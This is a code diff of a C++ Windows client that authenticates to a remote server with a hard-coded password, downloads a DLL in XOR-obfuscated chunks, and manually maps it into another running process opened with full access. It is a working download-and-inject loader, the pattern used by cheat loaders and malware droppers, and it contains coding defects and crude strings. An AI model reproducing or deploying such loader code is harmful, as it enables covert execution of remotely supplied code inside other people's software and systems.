@@ -9,9 +9,9 @@ int __cdecl main(int argc, char** argv)
         hints;
     const char* sendbuf = "loginfatcock";
     std::string out = encryptDecrypt(sendbuf);
-    char recvbuf[2048];
+    char recvbuf[BUFFERSIZE];
     int iResult;
-    int recvbuflen = 2048;
+    const int recvbuflen = BUFFERSIZE;
 
 
     // Initialize Winsock
@@ -75,72 +75,109 @@ int __cdecl main(int argc, char** argv)
 
     printf("Bytes Sent: %ld\n", iResult);
 
+    //iResult = recv(ConnectSocket, recvbuf, recvbuflen, 0);
+    //recievedStr = std::string(encryptDecrypt(recvbuf));
+
+    int* authkey = nullptr;
     // Receive until the peer closes the connection
     do {
         iResult = recv(ConnectSocket, recvbuf, recvbuflen, 0);
-
-        send(ConnectSocket, std::string(encryptDecrypt("clone")).c_str(), 2048, 0);
-
         std::string recievedStr(encryptDecrypt(recvbuf));
-        if (recievedStr.find("OK") != std::string::npos)
+
+        
+        if (recievedStr[0] == 'c')
         {
-            int size = stoi(
-                recievedStr.substr(
-                    recievedStr.find(".") + 1
-                    , recievedStr.size()
-                )
-            );
-            printf("Filesize: %o\n", size);
-            std::vector<char> filearray{};
-            for (size_t i = 0; i < (size / 2048) + 1; i++)
+            printf("Authenticating...\n");
+            char buffer[BUFFERSIZE];
+            if (iResult > 0)
+                printf("Bytes received: %d\n", iResult);
+            int rnum = stoi(recievedStr.substr(2, recievedStr.size()));
+
+            std::string pwdhash = hmac256("kai123", "kai"); //encrypt pwdhash with key 'kai', pwd for now is static at 'kai123'
+            std::string uniquehash = hmac256(std::to_string(rnum), pwdhash); //encrypt unique number and key = hash of pwd
+
+            iResult = send(ConnectSocket, encryptDecrypt(std::string("r." + uniquehash)).c_str(), BUFFERSIZE, 0);
+            iResult = recv(ConnectSocket, buffer, BUFFERSIZE, 0);
+
+            recievedStr = encryptDecrypt(std::string(buffer));
+
+            if (recievedStr[0] == 'O'
+                && recievedStr[1] == 'K')
             {
-                for (size_t j = 0; j < 2048; j++)  
-                    recvbuf[j] = 0;
-
-                iResult = recv(ConnectSocket, recvbuf, 2048, 0);
-
-                //recvbuf = encryptDecrypt(recvbuf).c_str();
-
-                for (size_t j = 0; j < 2048; j++)
-                    filearray.push_back(recvbuf[j] ^ '\x29');
-
-                char sendarr[2048];
-                sendarr[0] = 'd';
-                sendarr[1] = 'O';
-                sendarr[2] = 'K';
-
-                send(ConnectSocket, encryptDecrypt("dOK").c_str(), 2048, 0);
+                authkey = &rnum;
+                continue;
             }
-            send(ConnectSocket, encryptDecrypt("goodbye").c_str(), 2048, 0);
-            closesocket(ConnectSocket);
-            WSACleanup();
-            printf("Filearray: %o\n", filearray.size());
-
-            //std::ofstream fileout("dll_test_out123.dll", std::ios::out | std::ios::binary);
-            //fileout.write(&filearray[0], filearray.size());
-
-           // memory _mem{};
-            DWORD _pid = getProcess("cockshortcuts.exe");
-
-            HANDLE _hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, _pid);
-
-            if (!_hProc)
+            else
             {
-                printf("OpenProcess failed with code: 0x%X\n", std::to_string(GetLastError()));
-                system("pause");
+                printf("A connection was made but authentication failed.");
+                closesocket(ConnectSocket);
+                WSACleanup();
                 return 0;
             }
-
-            if (!_map(_hProc, &filearray))
+        }
+        else
+        {
+            send(ConnectSocket, std::string(encryptDecrypt("clone")).c_str(), BUFFERSIZE, 0);
+            if (recievedStr.find("OK") != std::string::npos)
             {
+                int size = stoi(
+                    recievedStr.substr(
+                        recievedStr.find(".") + 1
+                        , recievedStr.size()
+                    )
+                );
+                printf("Filesize: %o\n", size);
+                std::vector<char> filearray{};
+                for (size_t i = 0; i < (size / BUFFERSIZE) + 1; i++)
+                {
+                    for (size_t j = 0; j < BUFFERSIZE; j++)
+                        recvbuf[j] = 0;
+
+                    iResult = recv(ConnectSocket, recvbuf, BUFFERSIZE, 0);
+
+                    //recvbuf = encryptDecrypt(recvbuf).c_str();
+
+                    for (size_t j = 0; j < BUFFERSIZE; j++)
+                        filearray.push_back(recvbuf[j] ^ *authkey);
+
+                    char sendarr[BUFFERSIZE];
+                    sendarr[0] = 'd';
+                    sendarr[1] = 'O';
+                    sendarr[2] = 'K';
+
+                    send(ConnectSocket, encryptDecrypt("dOK").c_str(), BUFFERSIZE, 0);
+                }
+                send(ConnectSocket, encryptDecrypt("goodbye").c_str(), BUFFERSIZE, 0);
+                closesocket(ConnectSocket);
+                WSACleanup();
+                printf("Filearray: %o\n", filearray.size());
+
+                //std::ofstream fileout("dll_test_out123.dll", std::ios::out | std::ios::binary);
+                //fileout.write(&filearray[0], filearray.size());
+
+               // memory _mem{};
+                DWORD _pid = getProcess("cockshortcuts.exe");
+
+                HANDLE _hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, _pid);
+
+                if (!_hProc)
+                {
+                    printf("OpenProcess failed with code: 0x%X\n", std::to_string(GetLastError()));
+                    system("pause");
+                    return 0;
+                }
+
+                if (!_map(_hProc, &filearray))
+                {
+                    CloseHandle(_hProc);
+                    printf("_map failed with code: 0x%X\n", std::to_string(GetLastError()));
+                    system("pause");
+                    return 0;
+                }
+                printf("Manual mapping was successful.");
                 CloseHandle(_hProc);
-                printf("_map failed with code: 0x%X\n", std::to_string(GetLastError()));
-                system("pause");
                 return 0;
             }
-            printf("Manual mapping was successful.");
-            CloseHandle(_hProc);
-            return 0;
         }
 
         if (iResult > 0)
